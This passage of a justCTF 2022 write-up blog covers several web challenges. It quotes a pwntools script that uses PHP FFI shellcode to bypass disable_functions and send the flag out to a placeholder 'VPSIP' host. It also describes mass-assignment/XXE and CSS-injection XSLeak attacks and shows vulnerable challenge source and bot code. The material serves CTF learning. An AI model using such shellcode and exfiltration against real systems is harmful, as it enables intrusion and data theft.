<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"172.20.13.37"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$f</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"justCTF&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG=<span class="token interpolation"><span class="token variable">$f</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag <span class="token interpolation"><span class="token variable">$f</span></span> set"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG=aaand_it's_gone"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span><span class="token string single-quoted-string">'
    &lt;style>
    div &#123;
      display: table;
      margin-right: auto;
      margin-left: auto;
    &#125;
    &lt;/style>
    &lt;body>
    &lt;div>&lt;img src="itsgone.gif" width="497" height="280">&lt;/div>
    &lt;/body>
    '</span><span class="token punctuation">;</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">show_source</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>There is <code>eval</code> that can execute any code, but there are a lot of things in <code>disable_functions</code>.</p>
<p>I didn’t understand the final solution very well. It seems that you need to write some shell code and use a function that can be used. Here is the solution I saw in <a target="_blank" rel="noopener" href="https://discord.com/channels/656258740252704788/978311401439363112/985623102190940240">discord</a> (by Tony_Bamanaboni):</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> hexlify
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
payload <span class="token operator">=</span> <span class="token string">"addr: .quad 0\nnop\nnop\nnop\nnop\nnop"</span>
payload <span class="token operator">+=</span> <span class="token triple-quoted-string string">"""
call $+5
pop r13
and r13, -4096
mov r13, [r13]
"""</span>
payload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"VPSIP"</span><span class="token punctuation">,</span> <span class="token number">6666</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>egghunter<span class="token punctuation">(</span><span class="token string">b'CTF&#123;'</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token triple-quoted-string string">"""mov rsi, rdi
mov rdi, rbp
mov rdx, 50
mov rax, 1
syscall
ret
"""</span>
payload <span class="token operator">=</span> hexlify<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
php <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
$pl=hex2bin("%s");
$l=FFI::cdef("char* mmap(int,int,int,int,int,int);void alarm(int);void signal(int,void*);","libc.so.6");
$p=$l->mmap(0,0x1000,7,0x21,-1,0);
$p2=$l->environ;
FFI::memcpy($p,FFI::addr($p2),8);
for($idx=8;$idx&lt;strlen($pl);$idx++)&#123;$p[$idx]=$pl[$idx];&#125;
$l->signal(14,$p+8);
$l->alarm(5);
'''</span> <span class="token operator">%</span> payload
<span class="token keyword">print</span><span class="token punctuation">(</span>php<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'%2b'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2><span id="web-api-intended4-solves">Web API intended(4 solves)</span></h2><p>This question gives you an API document that allows you to register, log in, modify data, and create some data, etc.</p>
<p>When I was working on it, I saw that there was a <code>/jwk</code> URL in the JWT, and when I tried to change it to something else, I found that I didn’t receive a request, so I went to play other questions first.</p>
<p>From the discussion on discord afterwards, the solution is that there is a mass assignment bug in changing user data, which can change yourself to <code>is_admin: true</code>, and then there is XML that can be eaten by other endpoints, so XXE and read <code>/flag.txt</code>, and it’s over.</p>
<p>The concept doesn’t seem too difficult, but after all, it’s a black box, so there are more things to test, and sometimes you may get stuck trying a few paths, and then go to solve the white box questions first.</p>
<h2><span id="ninja1-solves">Ninja(1 solves)</span></h2><p>An interesting XSleak question that blocked all the unintended things I could think of.</p>
<p>The core code of this question is as follows:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&#123;% extends "base.html" %&#125;

&#123;% block css %&#125;
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
    <span class="token selector">.consent_color</span> <span class="token punctuation">&#123;</span>
        <span class="token selector">color:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> consent.color_palette <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
&#123;% endblock %&#125;

&#123;% block content %&#125;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>generate-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row g-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-6 col-md-8 mx-auto<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mb-3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Cookie consent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>my-4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card shadow-sm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>d-flex justify-content-between align-items-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn-group <span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token comment">&lt;!--FIX: reported HTML injection, added filters --></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;&#123;link|replace('&lt;',<span class="token punctuation">"</span></span><span class="token attr-name">&amp;gt;")|replace('</span><span class="token punctuation">></span></span>',"<span class="token entity named-entity" title="&lt;">&amp;lt;</span>")|safe&#125;&#125;">Open Preferences<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>❤️<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span>
&#123;% endblock %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>You can clearly see CSS injection (the server blocks up to 140 characters), and control of the <code>href</code> of <code>&lt;a&gt;</code> and the addition of arbitrary attributes.</p>
<p>The flag is the admin user, which appears in the upper part, and the content looks like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nickname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hello, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>A<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>e<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>i<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>k<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>o<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>o<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>i<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/justctf-2022-writeup/p1.png" alt="flag"></p>
<p>The CSP looks like this:</p>
<blockquote>
<p>default-src ‘none’; font-src <a target="_blank" rel="noopener" href="http://ninja.web.jctf.pro/static/">http://ninja.web.jctf.pro/static/</a>; form-action ‘self’; object-src ‘none’; script-src <a target="_blank" rel="noopener" href="http://ninja.web.jctf.pro/static/">http://ninja.web.jctf.pro/static/</a>; base-uri ‘none’; style-src <a target="_blank" rel="noopener" href="http://ninja.web.jctf.pro/static/">http://ninja.web.jctf.pro/static/</a> ‘unsafe-inline’; img-src * data:;</p>
</blockquote>
<p>Basically, only <code>img</code> is unblocked, and everything else is blocked.</p>
<p>Then there is a key point that the bot for this question installed a package called “ninja cookie”, which seems to automatically click on buttons that do not accept cookies. The bot for this question is also very classic, blocking a lot of things:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> traceback
<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>options <span class="token keyword">import</span> Options
<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> WebDriverWait
<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support <span class="token keyword">import</span> expected_conditions <span class="token keyword">as</span> EC
<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By
<span class="token keyword">import</span> os
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
<span class="token keyword">import</span> time


app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token keyword">import</span> sys
<span class="token keyword">import</span> logging

TASK <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'BASE_URL'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">"http://127.0.0.1:5000"</span>
flag <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'justCTF&#123;fake&#125;'</span>
pwd <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'PASSWD'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'admin'</span>

<span class="token keyword">def</span> <span class="token function">visit_url</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">str</span> <span class="token keyword">or</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Visiting:"</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    options <span class="token operator">=</span> Options<span class="token punctuation">(</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'no-sandbox'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-dev-shm-usage'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-infobars'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-background-networking'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-default-apps'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-gpu'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-sync'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-translate'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-lazy-image-loading'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'hide-scrollbars'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'metrics-recording-only'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'mute-audio'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'no-first-run'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'dns-prefetch-disable'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'safebrowsing-disable-auto-update'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'media-cache-size=1'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disk-cache-size=1'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-features=LazyImageLoading,AutomaticLazyImageLoading,LazyFrameLoading,AutomaticLazyFrameLoading,AutoLazyLoadOnReloads'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--js-flags=--noexpose_wasm,--jitless'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'hide-scrollbars'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'load-extension=ninja-cookie'</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        browser <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token string">'/usr/local/bin/chromedriver'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>options<span class="token punctuation">,</span> service_args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'--verbose'</span><span class="token punctuation">,</span> <span class="token string">'--log-path=/tmp/chromedriver.log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>TASK<span class="token operator">+</span><span class="token string">"/login"</span><span class="token punctuation">)</span>
        WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">:</span> r<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return document.readyState'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'complete'</span><span class="token punctuation">)</span>
        inputElement <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>
        inputElement<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        inputElement <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>
        inputElement<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>
        browser<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">"submit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>
        WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">:</span> r<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return document.readyState'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'complete'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>timeout<span class="token punctuation">)</span>

        browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">:</span> r<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return document.readyState'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'complete'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error visiting'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> traceback<span class="token punctuation">.</span>format_exc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Done visiting'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    visit_url<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">"ok"</span>
